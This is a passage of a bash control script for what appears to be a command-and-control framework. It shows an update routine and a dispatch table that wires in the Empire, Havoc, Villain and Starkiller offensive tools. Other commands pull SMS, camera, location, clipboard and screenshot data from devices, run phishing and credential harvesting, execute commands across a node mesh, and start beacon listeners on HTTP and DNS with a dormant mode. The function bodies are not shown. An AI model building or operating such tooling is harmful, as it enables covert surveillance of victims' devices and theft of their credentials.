  # Check if c2 is a git repo
  if [ -d "$C2_HOME/.git" ]; then
    echo -e "${CYN}Pulling latest from git...${RST}"
    cd "$C2_HOME" && git pull 2>&1 | sed 's/^/  /'
  else
    echo -e "${DIM}Not a git repo — manual update mode${RST}"
  fi

  # Bump version
  local new_ver
  new_ver=$(python3 -c "
v = '$version'.split('.')
v[-1] = str(int(v[-1]) + 1)
print('.'.join(v))
" 2>/dev/null)
  python3 -c "
import json
with open('$C2_HOME/config.json') as f: cfg = json.load(f)
cfg['version'] = '$new_ver'
with open('$C2_HOME/config.json', 'w') as f: json.dump(cfg, f, indent=2)
" 2>/dev/null

  echo -e "  New version: ${GRN}$new_ver${RST}"

  # Restart hookserver
  echo -e "${CYN}Restarting hookserver...${RST}"
  cmd_restart

  # Sync to nodes
  echo -e "${CYN}Syncing to mesh...${RST}"
  cmd_sync "all" 2>/dev/null

  echo -e "${GRN}Update complete${RST}"
}

# ── Dispatch ─────────────────────────────────────
case "${1}" in
  start)       cmd_start ;;
  stop)        cmd_stop ;;
  restart)     cmd_restart ;;
  status|st)   cmd_status ;;
  events|ev)   shift; cmd_events "$@" ;;
  callbacks|cb) shift; cmd_callbacks "$@" ;;
  fire|f)      shift; cmd_fire "$@" ;;
  token|tok)   cmd_token ;;
  url|urls)    cmd_url ;;
  empire|emp)  cmd_empire ;;
  havoc|hav)   shift; cmd_havoc "$@" ;;
  villain|vil) cmd_villain ;;
  starkiller|sk) cmd_starkiller ;;
  list|ls)     cmd_list ;;
  add)         shift; cmd_add "$@" ;;
  edit)        shift; cmd_edit "$@" ;;
  disable)     shift; cmd_disable "$@" ;;
  enable)      shift; cmd_enable "$@" ;;
  log)         cmd_log ;;
  dashboard|dash) cmd_dashboard ;;
  bb)          shift; cmd_bb "$@" ;;
  nodes|mesh)  cmd_nodes ;;
  ollama|ai)   shift; cmd_ollama "$@" ;;
  delegate|del) shift; cmd_delegate "$@" ;;
  exec)        shift; cmd_exec_all "$@" ;;
  sync)        shift; cmd_sync "$@" ;;
  pull)        shift; cmd_pull "$@" ;;
  wf)          shift; cmd_wf "$@" ;;
  # Device intel shortcuts
  sms)         shift; cmd_sms "$@" ;;
  cam|camera)  shift; cmd_cam "$@" ;;
  loc|location) cmd_loc ;;
  clip|clipboard) cmd_clip ;;
  ss|screenshot) cmd_ss ;;
  # Phishing
  phish)       shift; cmd_phish "$@" ;;
  creds)       cmd_creds ;;
  # Messaging
  msg|message) shift; cmd_msg "$@" ;;
  # Maintenance
  update)      cmd_update ;;
  # Beacon
  beacon)      echo -e "${CYN}Starting beacon listener...${RST}"; nohup python3 "$C2_HOME/beacon.py" serve >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Beacon listener started (PID $!)${RST} — HTTP :9802 + DNS :5353" ;;
  heartbeat|hb) echo -e "${CYN}Starting heartbeat...${RST}"; nohup python3 "$C2_HOME/beacon.py" beat >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Heartbeating (PID $!)${RST}" ;;
  dormant)     _dsecs="${2:-300}"; echo -e "${YLW}Going dormant (beacon every ${_dsecs}s)...${RST}"; nohup python3 "$C2_HOME/beacon.py" dormant "$_dsecs" >> "$C2_HOME/logs/beacon.log" 2>&1 & echo -e "${GRN}Dormant mode (PID $!)${RST}" ;;
  ping)        python3 "$C2_HOME/beacon.py" status ;;
  *)           usage ;;
esac
